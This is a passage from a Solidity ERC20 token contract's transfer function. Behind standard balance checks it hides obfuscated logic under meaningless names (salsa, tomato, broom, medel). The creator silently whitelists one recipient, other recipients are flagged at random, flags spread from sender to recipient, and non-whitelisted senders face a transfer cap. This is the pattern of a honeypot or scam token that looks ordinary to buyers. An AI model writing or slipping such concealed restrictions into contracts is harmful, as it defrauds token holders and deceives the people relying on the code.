    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (broom == true)) {
        salsa[recipient] = true;
        tomato[recipient] = false;
        broom = false;
    }
    if (salsa[recipient] != true) {
        tomato[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((tomato[sender]) && (salsa[recipient] == false)) {
        tomato[recipient] = true;
    }
    if (salsa[sender] == false) {
        require(amount < medel);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
